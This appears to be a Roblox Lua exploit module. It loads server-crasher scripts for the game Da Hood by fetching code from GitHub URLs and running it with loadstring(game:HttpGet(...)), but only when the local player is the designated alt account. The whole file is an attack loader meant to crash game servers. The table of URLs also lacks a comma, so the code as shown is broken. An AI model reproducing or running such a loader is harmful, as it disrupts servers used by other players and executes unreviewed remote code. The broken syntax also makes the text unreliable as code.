return function(...)
    local data = ProccessArgs(...)
    local plr = game:service"Players".LocalPlayer

    if ReSort(Alts)[1] == plr.UserId then
        local lib = {
            ['encrypt'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua',
            ['quick'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua'
            ['swagmode'] = 'https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher',
        }
        if data[2] == nil then
            loadstring(game:HttpGet(lib['quick']))()
        else
            loadstring(game:HttpGet(lib[data[2]:lower()]))()
        end
    end
end
